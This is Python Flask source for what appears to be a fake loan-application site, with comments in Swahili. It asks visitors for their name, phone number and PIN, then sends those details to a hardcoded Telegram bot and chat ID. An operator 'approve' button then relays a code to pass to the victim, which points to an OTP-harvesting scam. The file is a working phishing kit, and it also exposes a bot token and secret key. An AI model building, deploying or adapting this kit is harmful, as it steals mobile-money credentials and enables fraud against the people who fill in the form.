from flask import Flask, request, render_template_string, session, redirect
from flask_cors import CORS
import requests
import random
import time

app = Flask(__name__)
app.secret_key = "loan_secret_123"
CORS(app)

# TELEGRAM SETTINGS
TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
TELEGRAM_CHAT_ID = "8580615195"

pending_loans = {} 

def send_telegram_with_buttons(name, phone, pin, amount, loan_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ APPROVE", "callback_data": f"approve_{loan_id}"}],
            [{"text": "❌ REJECT", "callback_data": f"reject_{loan_id}"}]
        ]
    }
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    message = f"🔔 NEW LOAN APPLICATION!\n\n💰 Amount: ${amount}\n👤 Name: {name}\n📱 Phone: {phone}\n🔒 PIN: {pin}"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "reply_markup": keyboard}
    requests.post(url, json=data)

# PAGE 1: CHAGUA AMOUNT $100 - $500
@app.route('/', methods=['GET'])
def page1_amount():
    return render_template_string('''
    <style>
        body{font-family:Arial; text-align:center; padding:30px; background:#f2f2f2;}
      .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto; box-shadow:0 4px 10px rgba(0,0,0,0.1);}
      .amount-btn{display:block; width:100%; padding:15px; margin:10px 0; font-size:18px; border:2px solid #007bff; background:white; border-radius:8px; cursor:pointer; font-weight:bold;}
      .amount-btn:hover{background:#007bff; color:white;}
       h2{color:#007bff;}
    </style>
    <div class="box">
        <h2>Step 1 of 2</h2>
        <h3>Choose Loan Amount</h3>
        <form action="/page2" method="POST">
            <button class="amount-btn" name="amount" value="100">$100</button>
            <button class="amount-btn" name="amount" value="200">$200</button>
            <button class="amount-btn" name="amount" value="300">$300</button>
            <button class="amount-btn" name="amount" value="400">$400</button>
            <button class="amount-btn" name="amount" value="500">$500</button>
        </form>
    </div>
    ''')

# PAGE 2: WEKA MAELEZO
@app.route('/page2', methods=['POST'])
def page2_details():
    session['amount'] = request.form['amount']
    return render_template_string('''
    <style>
        body{font-family:Arial; text-align:center; padding:30px; background:#f2f2f2;}
      .box{background:white; padding:30px; border-radius:10px; max-width:400px; margin:auto; box-shadow:0 4px 10px rgba(0,0,0,0.1);}
        input{width:90%; padding:12px; margin:10px 0; border-radius:5px; border:1px solid #ccc; font-size:16px;}
      .submit{background:#28a745; color:white; border:none; font-size:18px; cursor:pointer; font-weight:bold;}
      .submit:hover{background:#218838;}
       h2{color:#007bff;}
       h3{color:#28a745;}
    </style>
    <div class="box">
        <h2>Step 2 of 2</h2>
        <h3>Loan Amount: ${{amount}}</h3>
        <form action="/submit" method="POST">
            <input type="text" name="name" placeholder="Full Name" required><br>
            <input type="text" name="phone" placeholder="07xxxxxxxx" required><br>
            <input type="password" name="pin" placeholder="Enter PIN" required><br>
            <input type="submit" class="submit" value="Apply Now">
        </form>
    </div>
    ''', amount=session['amount'])

# SUBMIT > TUMA KWENYE TELEGRAM
@app.route('/submit', methods=['POST'])
def submit_loan():
    name = request.form['name']
    phone = request.form['phone'] 
    pin = request.form['pin']
    amount = session['amount']
    
    loan_id = str(int(time.time()))
    pending_loans[loan_id] = {"name": name, "phone": phone, "pin": pin, "amount": amount}
    
    send_telegram_with_buttons(name, phone, pin, amount, loan_id)
    
    return f"<div style='text-align:center; padding:50px; font-family:Arial;'><h2>Asante {name}!</h2><p>Umeomba <b>${amount}</b>. Subiri approval kwenye Telegram.</p></div>"

# TELEGRAM WEBHOOK YA BUTTONS
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    data = request.get_json()
    if 'callback_query' in data:
        callback = data['callback_query']
        loan_id = callback['data'].split('_')[1]
        action = callback['data'].split('_')[0]
        
        if action == "approve":
            otp = str(random.randint(100000, 999))
            loan = pending_loans[loan_id]
            message = f"✅ APPROVED!\n\nMpe mteja {loan['name']} code hii:\n\n🔑 CODE: {otp}\nIna-expire in 60 seconds"
        else:
            message = "❌ LOAN REJECTED"
            
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message})
        
    return "ok"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
